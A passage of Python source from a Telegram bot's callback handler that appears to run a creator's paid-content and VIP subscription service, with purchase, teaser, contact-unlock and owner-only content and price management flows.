add_or_update_user(call.from_user)\n    \n    if call.data == \"vip_access\":\n        show_vip_access(call.message.chat.id, call.from_user.id)\n    elif call.data == \"buy_vip\":\n        purchase_vip_subscription(call.message.chat.id, call.from_user.id)\n    elif call.data == \"teasers\":\n        teaser_command(call.message)\n    elif call.data == \"browse_content\":\n        show_content_catalog(call.message.chat.id, call.from_user.id)\n    elif call.data == \"vip_content_catalog\":\n        show_vip_catalog(call.message.chat.id, call.from_user.id)\n    elif call.data == \"my_content\":\n        show_my_content(call.message.chat.id, call.from_user.id)\n    elif call.data == \"ask_question\":\n        # Check if user has VIP or has purchased content\n        user_id = call.from_user.id\n        vip_status = check_vip_status(user_id)\n        purchased_content = get_user_purchased_content(user_id)\n        \n        # User qualifies if they have VIP or have bought content\n        user_qualifies = vip_status['is_vip'] or len(purchased_content) > 0\n        \n        if user_qualifies:\n            # Show contact info for qualifying users\n            contact_message = \"\"\"\n💬 **Direct Contact Available** 💬\n\n🎉 Congrats, babe! As my VIP, you’re now at the front of the line:\n\n👤 **Contact me:** @blahgigi_official\n\n💕 I personally see and reply to every message from my supporters.\n\n🌟 **What you can expect:**\n• Personal responses from me\n• Behind-the-scenes conversations\n• Priority attention to your messages\n• Exclusive chat access\n\n✨ Babe, You’re not just a follower you’re part of my inner circle,I’ll keep giving you the best. !\n\"\"\"\n            markup = types.InlineKeyboardMarkup()\n            # Create URL button for direct contact\n            markup.add(types.InlineKeyboardButton(\"💬 Message @elylabella_official\", url=\"https://t.me/elylabella_official\"))\n            markup.add(types.InlineKeyboardButton(\"🛒 Browse More Content\", callback_data=\"browse_content\"))\n            markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n            \n            bot.send_message(call.message.chat.id, contact_message, reply_markup=markup)\n        else:\n            # Show VIP upgrade message for non-qualifying users\n            fomo_message = \"\"\"\n🚫 **Chat Access Restricted** 🚫\n\n💎 This feature is exclusive to VIP members and content purchasers only!\n\n🌟 **You're missing out on:**\n• Direct personal conversations with me\n• Priority responses to all your messages  \n• Exclusive behind-the-scenes chat access\n• Personal attention and custom interactions\n\n💰 Upgrade to VIP or purchase content to unlock direct chat access!\n\"\"\"\n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"💎 Upgrade to VIP Now\", callback_data=\"vip_access\"))\n            markup.add(types.InlineKeyboardButton(\"🛒 Browse Content Instead\", callback_data=\"browse_content\"))\n            \n            bot.send_message(call.message.chat.id, fomo_message, reply_markup=markup)\n    elif call.data == \"help\":\n        help_command(call.message)\n    elif call.data == \"cmd_help\":\n        help_command(call.message)\n    elif call.data == \"cmd_start\":\n        # Create proper message object with callback user info\n        fake_message = type('obj', (object,), {\n            'chat': call.message.chat,\n            'from_user': call.from_user,\n            'message_id': call.message.message_id\n        })\n        start_command(fake_message)\n    elif call.data == \"cmd_teaser\":\n        # Create proper message object with callback user info\n        fake_message = type('obj', (object,), {\n            'chat': call.message.chat,\n            'from_user': call.from_user,\n            'message_id': call.message.message_id\n        })\n        teaser_command(fake_message)\n    elif call.data == \"buy_premium\":\n        show_content_catalog(call.message.chat.id)\n    elif call.data.startswith(\"buy_\"):\n        item_name = call.data.replace(\"buy_\", \"\")\n        purchase_item(call.message.chat.id, call.from_user.id, item_name)\n    elif call.data.startswith(\"vip_get_\"):\n        item_name = call.data.replace(\"vip_get_\", \"\")\n        deliver_vip_content(call.message.chat.id, call.from_user.id, item_name)\n    elif call.data.startswith(\"access_\"):\n        item_name = call.data.replace(\"access_\", \"\")\n        deliver_owned_content(call.message.chat.id, call.from_user.id, item_name)\n    elif call.data == \"owner_list_teasers\":\n        if not is_owner(call.from_user.id):\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        else:\n            # Create fake message object for the owner_list_teasers function\n            fake_message = type('obj', (object,), {\n                'chat': call.message.chat,\n                'from_user': call.from_user,\n                'message_id': call.message.message_id\n            })\n            owner_list_teasers(fake_message)\n    elif call.data == \"owner_help\":\n        if not is_owner(call.from_user.id):\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        else:\n            # Create fake message object for the owner_help function\n            fake_message = type('obj', (object,), {\n                'chat': call.message.chat,\n                'from_user': call.from_user,\n                'message_id': call.message.message_id\n            })\n            owner_help(fake_message)\n    elif call.data == \"owner_add_content\":\n        if not is_owner(call.from_user.id):\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        else:\n            bot.send_message(call.message.chat.id, \"📦 Use: /owner_add_content [name] [price] [url] [description]\")\n    elif call.data == \"owner_list_users\":\n        if not is_owner(call.from_user.id):\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        else:\n            # Create a fake message object for the owner_list_users function\n            fake_message = type('obj', (object,), {\n                'chat': call.message.chat,\n                'from_user': call.from_user\n            })\n            owner_list_users(fake_message)\n    elif call.data == \"cancel_upload\":\n        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions:\n            del upload_sessions[OWNERS[0]]\n            bot.send_message(call.message.chat.id, \"❌ Upload cancelled.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ No active upload session.\")\n    elif call.data == \"skip_description\":\n        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions:\n            session = upload_sessions[OWNERS[0]]\n            if session['step'] == 'waiting_for_description':\n                session['description'] = f\"Exclusive {session.get('file_type', 'content').lower()} content\"\n                save_uploaded_content(session)\n            else:\n                bot.send_message(call.message.chat.id, \"❌ Invalid step for skipping description.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ No active upload session.\")\n    elif call.data == \"start_upload\":\n        if call.from_user.id == OWNER_ID:\n            # Create a fake message object for the owner_upload_content function\n            fake_message = type('obj', (object,), {\n                'chat': call.message.chat,\n                'from_user': call.from_user,\n                'text': '/owner_upload'\n            })\n            owner_upload_content(fake_message)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"start_teaser_upload\":\n        if call.from_user.id == OWNER_ID:\n            # Create a fake message object for the teaser upload function\n            fake_message = type('obj', (object,), {\n                'chat': call.message.chat,\n                'from_user': call.from_user,\n                'text': '/owner_upload_teaser'\n            })\n            owner_upload_teaser(fake_message)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"cancel_teaser_upload\":\n        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'teaser':\n            del upload_sessions[OWNERS[0]]\n            bot.send_message(call.message.chat.id, \"❌ Teaser upload cancelled.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ No active teaser upload session.\")\n    elif call.data == \"skip_teaser_description\":\n        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'teaser':\n            session = upload_sessions[OWNERS[0]]\n            if session['step'] == 'waiting_for_description':\n                session['description'] = \"Exclusive teaser content\"\n                # Save teaser to database\n                try:\n                    add_teaser(session['file_id'], session['file_type'], session['description'])\n                    \n                    success_text = f\"\"\"\n🎉 **TEASER UPLOADED SUCCESSFULLY!** 🎉\n\n🎬 **Type:** {session['file_type'].title()}\n📝 **Description:** {session['description']}\n\nYour teaser is now live! Non-VIP users will see this when they use /teaser.\n\n🔄 You can upload multiple teasers - the most recent one will be shown first.\n\"\"\"\n                    \n                    markup = types.InlineKeyboardMarkup()\n                    markup.add(types.InlineKeyboardButton(\"🎬 Upload Another Teaser\", callback_data=\"start_teaser_upload\"))\n                    markup.add(types.InlineKeyboardButton(\"👥 View Customers\", callback_data=\"owner_list_users\"))\n                    \n                    bot.send_message(call.message.chat.id, success_text, reply_markup=markup)\n                    \n                    # Clear upload session\n                    del upload_sessions[OWNERS[0]]\n                    \n                except Exception as e:\n                    bot.send_message(call.message.chat.id, f\"❌ Error saving teaser: {str(e)}\")\n                    if OWNERS[0] in upload_sessions:\n                        del upload_sessions[OWNERS[0]]\n            else:\n                bot.send_message(call.message.chat.id, \"❌ Invalid step for skipping description.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ No active teaser upload session.\")\n    # VIP Management callbacks\n    elif call.data == \"cmd_vip\":\n        if call.from_user.id == OWNER_ID:\n            # Create fake message object for the vip_command function\n            fake_message = type('obj', (object,), {\n                'chat': call.message.chat,\n                'from_user': call.from_user,\n                'text': '/vip'\n            })\n            vip_command(fake_message)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"owner_list_vips\":\n        if call.from_user.id == OWNER_ID:\n            # Create fake message object for the owner_list_vips function\n            fake_message = type('obj', (object,), {\n                'chat': call.message.chat,\n                'from_user': call.from_user,\n                'text': '/owner_list_vips'\n            })\n            owner_list_vips(fake_message)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"vip_add_content\":\n        if call.from_user.id == OWNER_ID:\n            show_vip_add_content_interface(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"start_vip_upload\":\n        if call.from_user.id == OWNER_ID:\n            start_vip_upload_session(call.message.chat.id, call.from_user.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"cancel_vip_upload\":\n        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content':\n            del upload_sessions[OWNERS[0]]\n            bot.send_message(call.message.chat.id, \"❌ VIP upload cancelled.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ No active VIP upload session.\")\n    elif call.data == \"use_suggested_name\":\n        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content':\n            session = upload_sessions[OWNERS[0]]\n            if session['step'] == 'waiting_for_name' and 'suggested_name' in session:\n                # Check if suggested name is unique\n                suggested_name = session['suggested_name']\n                \n                # Check if name already exists\n                conn = sqlite3.connect('content_bot.db')\n                cursor = conn.cursor()\n                cursor.execute('SELECT name FROM content_items WHERE name = ?', (suggested_name,))\n                existing = cursor.fetchone()\n                conn.close()\n                \n                if existing:\n                    # Make name unique by adding timestamp\n                    timestamp = datetime.datetime.now().strftime('%H%M%S')\n                    suggested_name = f\"{suggested_name}_{timestamp}\"\n                \n                session['name'] = suggested_name\n                session['step'] = 'waiting_for_description'\n                \n                desc_text = f\"\"\"\n✅ <b>Name set:</b> {suggested_name}\n\n📝 <b>Step 3: Description (Optional)</b>\nAdd a description that VIP members will see:\n\n💡 <b>Examples:</b>\n• \"Exclusive behind-the-scenes content\"\n• \"Special VIP-only photo set\"\n• \"Premium video content for VIPs\"\n\n✏️ Type your description or skip to use a default:\n\"\"\"\n                \n                markup = types.InlineKeyboardMarkup(row_width=1)\n                markup.add(types.InlineKeyboardButton(\"⏭️ Skip Description\", callback_data=\"skip_vip_description\"))\n                markup.add(types.InlineKeyboardButton(\"❌ Cancel Upload\", callback_data=\"cancel_vip_upload\"))\n                \n                bot.send_message(call.message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')\n            else:\n                bot.send_message(call.message.chat.id, \"❌ Invalid step for using suggested name.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ No active VIP upload session.\")\n    elif call.data == \"skip_vip_description\":\n        if call.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content':\n            session = upload_sessions[OWNERS[0]]\n            if session['step'] == 'waiting_for_description':\n                session['description'] = f\"Exclusive VIP {session.get('file_type', 'content').lower()}\"\n                session['price'] = 0  # VIP content is free for VIP members\n                save_uploaded_content(session)\n            else:\n                bot.send_message(call.message.chat.id, \"❌ Invalid step for skipping description.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ No active VIP upload session.\")\n    elif call.data == \"vip_manage_content\":\n        if call.from_user.id == OWNER_ID:\n            show_vip_content_management(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"vip_settings\":\n        if call.from_user.id == OWNER_ID:\n            show_vip_settings_interface(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # Interactive VIP Settings Handlers\n    elif call.data == \"vip_set_price_btn\":\n        if call.from_user.id == OWNER_ID:\n            # Start VIP price setting session\n            upload_sessions[OWNERS[0]] = {\n                'type': 'vip_settings',\n                'setting': 'price',\n                'step': 'waiting_for_input'\n            }\n            \n            price_text = \"\"\"\n💰 <b>SET VIP SUBSCRIPTION PRICE</b> 💰\n\n💡 Enter the new VIP price in Telegram Stars (just the number):\n\n<b>Examples:</b>\n• 399 (current default)\n• 500\n• 1000\n• 5000\n\n💡 <b>Pricing Guide:</b>\n• Range: 1 - 150,000 Stars\n• 399 Stars ≈ $4 USD | 1,000 Stars ≈ $10 USD\n• Higher prices make VIP feel more exclusive\n\n✏️ <b>Just type the number and send:</b>\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"vip_settings\"))\n            \n            bot.send_message(call.message.chat.id, price_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    elif call.data == \"vip_set_duration_btn\":\n        if call.from_user.id == OWNER_ID:\n            # Start VIP duration setting session\n            upload_sessions[OWNERS[0]] = {\n                'type': 'vip_settings',\n                'setting': 'duration',\n                'step': 'waiting_for_input'\n            }\n            \n            duration_text = \"\"\"\n⏰ <b>SET VIP SUBSCRIPTION DURATION</b> ⏰\n\n📅 Enter the VIP duration in days (just the number):\n\n<b>Examples:</b>\n• 7 (1 week)\n• 30 (1 month - recommended)\n• 90 (3 months)\n• 365 (1 year)\n\n💡 <b>Duration Tips:</b>\n• 30 days balances value and recurring revenue\n• Shorter durations = more frequent renewals\n• Longer durations = better customer value\n\n✏️ <b>Just type the number and send:</b>\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"vip_settings\"))\n            \n            bot.send_message(call.message.chat.id, duration_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    elif call.data == \"vip_set_description_btn\":\n        if call.from_user.id == OWNER_ID:\n            # Start VIP description setting session\n            upload_sessions[OWNERS[0]] = {\n                'type': 'vip_settings',\n                'setting': 'description',\n                'step': 'waiting_for_input'\n            }\n            \n            desc_text = \"\"\"\n📝 <b>SET VIP SUBSCRIPTION DESCRIPTION</b> 📝\n\n✏️ Enter the new VIP description text:\n\n<b>This description appears when users see the VIP upgrade option.</b>\n\n💡 <b>Examples:</b>\n• \"Premium VIP access with exclusive content and direct chat\"\n• \"Unlock all exclusive content and get personal attention\"\n• \"VIP membership: exclusive photos, videos, and direct messaging\"\n\n🎯 <b>Tips for great descriptions:</b>\n• Highlight exclusive benefits\n• Mention direct access/chat\n• Keep it concise but appealing\n• Focus on what makes VIP special\n\n✏️ <b>Type your description and send:</b>\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"vip_settings\"))\n            \n            bot.send_message(call.message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    elif call.data == \"vip_analytics\":\n        if call.from_user.id == OWNER_ID:\n            show_vip_analytics(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"vip_teasers_management\":\n        if call.from_user.id == OWNER_ID:\n            show_vip_teasers_management(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"vip_teaser_upload\":\n        if call.from_user.id == OWNER_ID:\n            start_vip_teaser_upload_session(call.message.chat.id, call.from_user.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"vip_teaser_delete\":\n        if call.from_user.id == OWNER_ID:\n            show_vip_teaser_deletion_interface(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"vip_teaser_edit\":\n        if call.from_user.id == OWNER_ID:\n            show_vip_teaser_edit_interface(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"skip_vip_teaser_description\":\n        teaser_key = f\"{OWNER_ID}_vip_teaser\"\n        if call.from_user.id == OWNER_ID and teaser_key in upload_sessions and upload_sessions[teaser_key].get('type') == 'vip_teaser':\n            session = upload_sessions[teaser_key]\n            description = \"Exclusive VIP teaser content\"\n            \n            try:\n                add_teaser(session['file_path'], session['file_type'], description, vip_only=True)\n                \n                # Send notifications to all VIP subscribers about the new VIP teaser\n                notification_stats = notify_vip_teaser_uploaded(description)\n                \n                success_text = f\"\"\"\n🎉 <b>VIP TEASER UPLOADED SUCCESSFULLY!</b> 🎉\n\n🎬 <b>Type:</b> {session['file_type'].title()}\n📝 <b>Description:</b> {description}\n\n💎 Your VIP teaser is now live! VIP members will see this exclusive content when they use /teaser.\n\n📱 <b>VIP Notifications Sent:</b>\n✅ Delivered to {notification_stats['sent']} VIP members\n🚫 {notification_stats['blocked']} users have blocked the bot\n❌ {notification_stats['failed']} delivery failures\n\n🔄 You can upload multiple VIP teasers - the most recent one will be shown first to VIP members.\n\"\"\"\n                \n                markup = types.InlineKeyboardMarkup()\n                markup.add(types.InlineKeyboardButton(\"🎬 Upload Another VIP Teaser\", callback_data=\"vip_teaser_upload\"))\n                markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Teasers\", callback_data=\"vip_teasers_management\"))\n                \n                bot.send_message(call.message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')\n                \n            except Exception as e:\n                bot.send_message(call.message.chat.id, f\"❌ Error saving VIP teaser: {str(e)}\")\n            \n            # Clear upload session\n            if teaser_key in upload_sessions:\n                del upload_sessions[teaser_key]\n    elif call.data.startswith(\"delete_vip_teaser_\"):\n        if call.from_user.id == OWNER_ID:\n            teaser_id = int(call.data.replace(\"delete_vip_teaser_\", \"\"))\n            success = delete_teaser(teaser_id)\n            \n            if success:\n                bot.send_message(call.message.chat.id, f\"✅ VIP teaser deleted successfully!\")\n                show_vip_teasers_management(call.message.chat.id)\n            else:\n                bot.send_message(call.message.chat.id, f\"❌ VIP teaser not found.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"edit_vip_teaser_\"):\n        if call.from_user.id == OWNER_ID:\n            teaser_id = int(call.data.replace(\"edit_vip_teaser_\", \"\"))\n            start_vip_teaser_edit_session(call.message.chat.id, teaser_id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"vip_teasers_collection\":\n        show_vip_teasers_collection(call.message.chat.id, call.from_user.id)\n    elif call.data.startswith(\"vip_delete_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"vip_delete_\", \"\")\n            handle_vip_content_deletion(call.message.chat.id, content_name)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"vip_edit_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"vip_edit_\", \"\")\n            show_vip_content_edit_interface(call.message.chat.id, content_name)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"confirm_vip_delete_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"confirm_vip_delete_\", \"\")\n            # Actually delete the VIP content\n            if delete_vip_content(content_name):\n                bot.send_message(call.message.chat.id, f\"✅ VIP content '{content_name}' deleted successfully!\")\n                # Go back to VIP content management\n                show_vip_content_management(call.message.chat.id)\n            else:\n                bot.send_message(call.message.chat.id, f\"❌ Failed to delete VIP content '{content_name}'.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # New VIP content inline editing handlers\n    elif call.data.startswith(\"vip_upload_file_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"vip_upload_file_\", \"\")\n            # Start file upload session for this specific VIP content\n            upload_sessions[OWNERS[0]] = {\n                'type': 'vip_file_update',\n                'step': 'waiting_for_file',\n                'content_name': content_name,\n                'name': content_name,\n                'file_path': None\n            }\n            \n            upload_text = f\"\"\"\n📁 <b>UPLOAD NEW FILE FOR VIP CONTENT</b> 📁\n\n<b>Content:</b> {content_name}\n\n📤 <b>Send me the new file:</b>\n• Photo (JPG, PNG, etc.)\n• Video (MP4)\n• Animated GIF\n\n📝 Just upload the new file and I'll replace the current one!\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=f\"vip_edit_{content_name}\"))\n            \n            bot.send_message(call.message.chat.id, upload_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    elif call.data.startswith(\"vip_edit_price_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"vip_edit_price_\", \"\")\n            price_text = f\"\"\"\n💰 <b>EDIT PRICE FOR VIP CONTENT</b> 💰\n\n<b>Content:</b> {content_name}\n\n💡 <b>Note:</b> VIP content is typically set to 0 Stars because VIP members get FREE access to all VIP content. The subscription fee is what generates revenue.\n\n<b>Quick Command:</b>\n<code>/owner_edit_vip_price {content_name} [new_price]</code>\n\nExample: <code>/owner_edit_vip_price {content_name} 0</code>\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"🔙 Back to Edit\", callback_data=f\"vip_edit_{content_name}\"))\n            \n            bot.send_message(call.message.chat.id, price_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    elif call.data.startswith(\"vip_edit_desc_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"vip_edit_desc_\", \"\")\n            desc_text = f\"\"\"\n📝 <b>EDIT DESCRIPTION FOR VIP CONTENT</b> 📝\n\n<b>Content:</b> {content_name}\n\n✏️ <b>Quick Command:</b>\n<code>/owner_edit_vip_description {content_name} [new_description]</code>\n\n<b>Example:</b>\n<code>/owner_edit_vip_description {content_name} Exclusive premium VIP content just for you!</code>\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"🔙 Back to Edit\", callback_data=f\"vip_edit_{content_name}\"))\n            \n            bot.send_message(call.message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # Edit Content handlers\n    elif call.data == \"show_edit_content_menu\":\n        if call.from_user.id == OWNER_ID:\n            show_edit_content_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"edit_content_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"edit_content_\", \"\")\n            show_content_edit_interface(call.message.chat.id, content_name)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"confirm_delete_content_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"confirm_delete_content_\", \"\")\n            # Delete the content\n            conn = sqlite3.connect('content_bot.db')\n            cursor = conn.cursor()\n            cursor.execute('DELETE FROM content_items WHERE name = ?', (content_name,))\n            deleted_count = cursor.rowcount\n            conn.commit()\n            conn.close()\n            \n            if deleted_count > 0:\n                bot.send_message(call.message.chat.id, f\"✅ Content '{content_name}' deleted successfully!\")\n                # Go back to edit content menu\n                show_edit_content_menu(call.message.chat.id)\n            else:\n                bot.send_message(call.message.chat.id, f\"❌ Failed to delete content '{content_name}'.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"confirm_delete_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"confirm_delete_\", \"\")\n            # Delete the content\n            conn = sqlite3.connect('content_bot.db')\n            cursor = conn.cursor()\n            cursor.execute('DELETE FROM content_items WHERE name = ?', (content_name,))\n            deleted_count = cursor.rowcount\n            conn.commit()\n            conn.close()\n            \n            if deleted_count > 0:\n                bot.send_message(call.message.chat.id, f\"✅ Content '{content_name}' deleted successfully!\")\n                # Go back to delete content menu to show updated list\n                show_delete_content_menu(call.message.chat.id)\n            else:\n                bot.send_message(call.message.chat.id, f\"❌ Failed to delete content '{content_name}'.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # Edit Content field handlers\n    elif call.data.startswith(\"edit_price_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"edit_price_\", \"\")\n            bot.send_message(call.message.chat.id, f\"💰 To edit price for '{content_name}', use:\\n<code>/owner_edit_price {content_name} [new_price]</code>\\n\\nExample: <code>/owner_edit_price {content_name} 50</code>\", parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"edit_description_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"edit_description_\", \"\")\n            bot.send_message(call.message.chat.id, f\"📝 To edit description for '{content_name}', use:\\n<code>/owner_edit_description {content_name} [new_description]</code>\\n\\nExample: <code>/owner_edit_description {content_name} Amazing exclusive content!</code>\", parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"edit_file_path_\"):\n        if call.from_user.id == OWNER_ID:\n            content_name = call.data.replace(\"edit_file_path_\", \"\")\n            bot.send_message(call.message.chat.id, f\"📁 To edit file path for '{content_name}', use:\\n<code>/owner_edit_file_path {content_name} [new_file_path]</code>\\n\\nExample: <code>/owner_edit_file_path {content_name} https://example.com/newfile.jpg</code>\", parse_mode='HTML')\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # Analytics Dashboard handler\n    elif call.data == \"analytics_dashboard\":\n        if call.from_user.id == OWNER_ID:\n            show_analytics_dashboard(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # Section menu handlers\n    elif call.data == \"content_management_menu\":\n        if call.from_user.id == OWNER_ID:\n            show_content_management_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"teaser_management_menu\":\n        if call.from_user.id == OWNER_ID:\n            show_teaser_management_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"user_management_menu\":\n        if call.from_user.id == OWNER_ID:\n            show_user_management_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"bot_config_menu\":\n        if call.from_user.id == OWNER_ID:\n            show_bot_config_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    \n    # Helper callbacks for section menus\n    elif call.data == \"show_delete_content_help\":\n        if call.from_user.id == OWNER_ID:\n            show_delete_content_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"show_delete_teaser_menu\":\n        if call.from_user.id == OWNER_ID:\n            show_delete_teaser_menu(call.message.chat.id)\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data.startswith(\"delete_teaser_\"):\n        if call.from_user.id == OWNER_ID:\n            teaser_id = int(call.data.replace(\"delete_teaser_\", \"\"))\n            # Delete the teaser\n            success = delete_teaser(teaser_id)\n            \n            if success:\n                bot.send_message(call.message.chat.id, f\"✅ Teaser ID {teaser_id} deleted successfully!\")\n                # Go back to delete teaser menu\n                show_delete_teaser_menu(call.message.chat.id)\n            else:\n                bot.send_message(call.message.chat.id, f\"❌ Teaser ID {teaser_id} not found.\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"show_set_responses_help\":\n        if call.from_user.id == OWNER_ID:\n            bot.send_message(call.message.chat.id, \"✏️ To set AI responses, use: `/owner_set_response [key] [text]`\\n\\n🔤 Valid keys: greeting, question, compliment, default\\n\\n💡 Example: `/owner_set_response greeting Hello there! 😊`\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n    elif call.data == \"show_other_settings_help\":\n        if call.from_user.id == OWNER_ID:\n            bot.send_message(call.message.chat.id, \"⚙️ Other available settings:\\n\\n• `/owner_set_vip_price [stars]` - Set VIP subscription price\\n• Use the 💎 VIP Dashboard for VIP settings\\n• Most other settings are in the VIP dashboard\")\n        else:\n            bot.send_message(call.message.chat.id, \"❌ Access denied. This is 